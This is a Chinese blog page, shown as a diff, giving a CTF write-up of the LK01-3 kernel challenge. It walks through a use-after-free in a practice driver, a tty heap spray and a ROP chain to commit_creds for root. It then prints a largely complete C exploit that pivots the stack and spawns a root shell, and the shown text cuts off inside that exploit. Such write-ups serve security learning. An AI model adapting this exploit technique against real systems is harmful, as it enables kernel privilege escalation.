@@ -1,0 +1,689 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="google-site-verification" content="McULNauwae3fxE8yPK3QNQNAYvG6cZAJ02xx9Lpbc98" />
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/hope.jpg">
+  <link rel="icon" href="/img/hope.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="hope">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言UAF是用户态中常见的漏洞，在内核中同样存在UAF漏洞，都是由于对释放后的空间处理不当，导致被释放后的堆块仍然可以使用所造成的漏洞。 LK01-3结合题目来看UAF漏洞 项目地址：https:&#x2F;&#x2F;github.com&#x2F;h0pe-ay&#x2F;Kernel-Pwn&#x2F;tree&#x2F;master&#x2F;LK01-3 open模块在执行open模块时会分配0x400大小的堆空间，并将地址存储在g_buf中 123456">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hope">
+<meta property="og:url" content="https://h0pe-ay.github.io/Kernel-Pwn-UAF/index.html">
+<meta property="og:site_name" content="hope">
+<meta property="og:description" content="前言UAF是用户态中常见的漏洞，在内核中同样存在UAF漏洞，都是由于对释放后的空间处理不当，导致被释放后的堆块仍然可以使用所造成的漏洞。 LK01-3结合题目来看UAF漏洞 项目地址：https:&#x2F;&#x2F;github.com&#x2F;h0pe-ay&#x2F;Kernel-Pwn&#x2F;tree&#x2F;master&#x2F;LK01-3 open模块在执行open模块时会分配0x400大小的堆空间，并将地址存储在g_buf中 123456">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309181846515.png">
+<meta property="article:published_time" content="2023-09-18T10:44:04.038Z">
+<meta property="article:author" content="hope">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309181846515.png">
+  
+  
+  
+  <title>hope</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"h0pe-ay.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZqEEnP8vrF2LzEKjCt8pL5Cf-gzGzoHsz","app_key":"6Owvec9nVB4K93xxi7CKzAqh","server_url":"https://zqeenp8v.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>hope</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-18 18:44" pubdate>
+          2023年9月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          50 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>UAF</code>是用户态中常见的漏洞，在内核中同样存在<code>UAF</code>漏洞，都是由于对释放后的空间处理不当，导致被释放后的堆块仍然可以使用所造成的漏洞。</p>
+<h1 id="LK01-3"><a href="#LK01-3" class="headerlink" title="LK01-3"></a>LK01-3</h1><p>结合题目来看<code>UAF</code>漏洞</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/h0pe-ay/Kernel-Pwn/tree/master/LK01-3">https://github.com/h0pe-ay/Kernel-Pwn/tree/master/LK01-3</a></p>
+<h2 id="open模块"><a href="#open模块" class="headerlink" title="open模块"></a>open模块</h2><p>在执行<code>open</code>模块时会分配<code>0x400</code>大小的堆空间，并将地址存储在<code>g_buf</code>中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE 0x400</span><br><br><span class="hljs-type">char</span> *g_buf = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">module_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>  printk(KERN_INFO <span class="hljs-string">&quot;module_open called\n&quot;</span>);<br><br>  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);<br>  <span class="hljs-keyword">if</span> (!g_buf) &#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;kmalloc failed&quot;</span>);<br>    <span class="hljs-keyword">return</span> -ENOMEM;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="read模块"><a href="#read模块" class="headerlink" title="read模块"></a>read模块</h2><p>在读模块中，会从用户空间中读取<code>0x400</code>字节到<code>g_buf</code>执行的堆空间中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">module_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">                           <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count,</span><br><span class="hljs-params">                           <span class="hljs-type">loff_t</span> *f_pos)</span><br>&#123;<br>  printk(KERN_INFO <span class="hljs-string">&quot;module_read called\n&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (count &gt; BUFFER_SIZE) &#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;invalid buffer size\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (copy_to_user(buf, g_buf, count)) &#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;copy_to_user failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="write模块"><a href="#write模块" class="headerlink" title="write模块"></a>write模块</h2><p>在写模块中，会从用户空间拷贝<code>400</code>字节数据到内核堆空间中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">module_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">                            <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count,</span><br><span class="hljs-params">                            <span class="hljs-type">loff_t</span> *f_pos)</span><br>&#123;<br>  printk(KERN_INFO <span class="hljs-string">&quot;module_write called\n&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (count &gt; BUFFER_SIZE) &#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;invalid buffer size\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (copy_from_user(g_buf, buf, count)) &#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;copy_from_user failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> -EINVAL;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> count;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="close模块"><a href="#close模块" class="headerlink" title="close模块"></a>close模块</h2><p><code>close</code>模块会释放<code>g_buf</code>指向的堆块空间</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">module_close</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br>  printk(KERN_INFO <span class="hljs-string">&quot;module_close called\n&quot;</span>);<br>  kfree(g_buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在读写模块中都限制了长度为<code>0x400</code>，这与一开始分配的堆空间大小一致，因此与LK01-2不同的是不存在堆溢出漏洞。但是在<code>open</code>模块中<code>g_buf</code>是唯一用来存储堆地址的变量，并且没有进行次数限制，那么就会导致多次调用<code>open</code>模块会使得存在多个指针指向同一块内存，若该内存被释放就会造成<code>UAF</code>漏洞。下图就是构造<code>UAF</code>漏洞的流程。</p>
+<p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202309181846515.png" srcset="/img/loading.gif" lazyload alt="image-20230911210004615"></p>
+<p>当把<code>g_buf</code>释放掉后，通过<code>fd2</code>文件描述符同样能够操控<code>g_buf</code>的空间，问题是该如何劫持程序流程，由于堆空间是通过<code>slab</code>分配器进行分配的，而<code>slab</code>还可而已进行缓存，因此<code>g_buf</code>被释放后会放进缓存中，而<code>g_buf</code>的大小为<code>0x400</code>这与<code>tty</code>结构体一致，因此此时通过堆喷确保<code>g_buf</code>被分配到<code>tty</code>结构体。构造<code>uaf</code>的代码如下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>	<span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/holstein&quot;</span>, O_RDWR);<br>	<span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/holstein&quot;</span>, O_RDWR);<br>	close(fd1);<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++)<br>	&#123;<br>		spray[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);<br>		<span class="hljs-keyword">if</span> (spray[i] == <span class="hljs-number">-1</span>)<br>		&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error!\n&quot;</span>);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>		&#125;<br>	&#125;<br>...<br></code></pre></td></tr></table></figure>
+
+<p>这里我有一个疑惑的点，在模块中的<code>close</code>函数仅仅只是释放了<code>g_buf</code>的堆内存并没有后续操作，因此在执行<code>close(fd1)</code>之后，是不是还能对文件描述符<code>fd1</code>进行操作，后来试验之后发现不行，查询资料得到，文件描述符的移除是内核默认操作与重定义模块的<code>close</code>操作无关。</p>
+<p>在构造出<code>UAF</code>漏洞并进行堆喷之后，实际操作的<code>g_buf</code>指向的是<code>tty</code>的结构体，该结构体偏移<code>0x18</code>是一个函数表的操作指针，那么将该函数表修改为自定义的函数表即可。后续的操作与<code>LK01-3</code>一致，将指针操作修改为栈迁移到堆上，然后就是执行<code>commit_creds(prepare_kernel_cred(0))</code>，利用<code>swapgs_restore_regs_and_return_to_usermode</code>绕过<code>kpti</code>的保护。</p>
+<h2 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 64M \<br>    -nographic \<br>    -kernel bzImage \<br>    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr&quot; \<br>    -no-reboot \<br>    -cpu qemu64,+smap,+smep \<br>    -smp 1 \<br>    -monitor /dev/null \<br>    -initrd initramfs.cpio.gz \<br>    -net nic,model=virtio \<br>    -net user \<br>    -s<br></code></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> spray[<span class="hljs-number">100</span>];<br><br><span class="hljs-comment">//0xffffffff8114fbe8: add al, ch; push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; </span><br><span class="hljs-comment">//0xffffffff8114078a: pop rdi; ret;</span><br><span class="hljs-comment">//0xffffffff81638e9b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; </span><br><span class="hljs-comment">//0xffffffff810eb7e4: pop rcx; ret;</span><br><span class="hljs-comment">//0xffffffff81072560 T prepare_kernel_cred</span><br><span class="hljs-comment">//0xffffffff810723c0 T commit_creds</span><br><span class="hljs-comment">//0xffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> push_rdx_pop_rsp_offset 0x14fbe8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_ret_offset 0x14078a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rcx_ret_offset 0xeb7e4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prepare_kernel_cred_offset 0x72560</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> commit_creds_offset 0x723c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs_restore_regs_and_return_to_usermode_offset 0x800e10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rdi_rax_offset  0x638e9b</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs, user_sp, user_ss, user_rflags;<br><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;****getshell****&quot;</span>);<br>	system(<span class="hljs-string">&quot;id&quot;</span>);<br>	system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_user_land</span><span class="hljs-params">()</span><br>&#123;<br>	__asm__(<br>		<span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br>		<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>		<span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>		<span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>		<span class="hljs-string">&quot;pushf;&quot;</span><br>		<span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>		<span class="hljs-string">&quot;.att_syntax;&quot;</span><br>	);<br>	<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Saved userland registers&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] cs: 0x%lx \n&quot;</span>, user_cs);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] ss: 0x%lx \n&quot;</span>, user_ss);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rsp: 0x%lx \n&quot;</span>, user_sp);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] rflags: 0x%lx \n&quot;</span>, user_rflags);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[#] backdoor: 0x%lx \n\n&quot;</span>, backdoor);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>	save_user_land();<br>	<span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/holstein&quot;</span>, O_RDWR);<br>	<span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/holstein&quot;</span>, O_RDWR);<br>	close(fd1);<br>	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++)<br>	&#123;<br>		spray[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);<br>		<span class="hljs-keyword">if</span> (spray[i] == <span class="hljs-number">-1</span>)<br>		&#123;<br>			<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error!\n&quot;</span>);<br>			<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>		&#125;<br>	&#125;<br>	<span class="hljs-type">char</span> buf[<span class="hljs-number">0x400</span>];<br>	read(fd2, buf, <span class="hljs-number">0x400</span>);<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf;<br>	<span class="hljs-comment">//for (unsigned int i = 0; i &lt; 0x80; i++)</span><br>	<span class="hljs-comment">//	printf(&quot;[%x]:addr:0x%lx\n&quot;,i,p[i]);</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_addr = p[<span class="hljs-number">3</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> heap_addr = p[<span class="hljs-number">7</span>];<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_addr:0x%lx\nheap_addr:0x%lx\n&quot;</span>,kernel_addr,heap_addr);<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> kernel_base = kernel_addr - <span class="hljs-number">0xc39c60</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> g_buf = heap_addr - <span class="hljs-number">0x38</span>;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base:0x%lx\ng_buf:0x%lx\n&quot;</span>,kernel_base,g_buf);<br>	*(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;buf[<span class="hljs-number">0x18</span>] = g_buf;<br>	p[<span class="hljs-number">0xc</span>] = push_rdx_pop_rsp_offset + kernel_base;<br>	<span class="hljs-comment">//for (unsigned long i = 0xd; i &lt; 0x80; i++)</span><br>	<span class="hljs-comment">//	p[i] = i;</span><br>	p[<span class="hljs-number">0x21</span>] = pop_rdi_ret_offset + kernel_base;<br>	p[<span class="hljs-number">0x22</span>] = <span class="hljs-number">0</span>;<br>	p[<span class="hljs-number">0x23</span>] = prepare_kernel_cred_offset + kernel_base;<br>	p[<span class="hljs-number">0x24</span>] = pop_rcx_ret_offset + kernel_base;<br>	p[<span class="hljs-number">0x25</span>] = <span class="hljs-number">0</span>;<br>	p[<span class="hljs-number">0x26</span>] = mov_rdi_rax_offset + kernel_base;<br>	p[<span class="hljs-number">0x27</span>] = commit_creds_offset + kernel_base;<br>	p[<span class="hljs-number">0x28</span>] = swapgs_restore_regs_and_return_to_usermode_offset + <span class="hljs-number">0x16</span> + kernel_base;<br>	p[<span class="hljs-number">0x29</span>] = <span class="hljs-number">0</span>;<br>	p[<span class="hljs-number">0x2a</span>] = <span class="hljs-number">0</span>;<br>	p[<span class="hljs-number">0x2b</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>    p[<span class="hljs-number">0x2c</span>] = user_cs;<br>    p[<span class="hljs-number">0x2d</span>] = user_rflags;<br>    p[<span class="hljs-number">0x2e</span>] = user_sp;<br>    p[<span 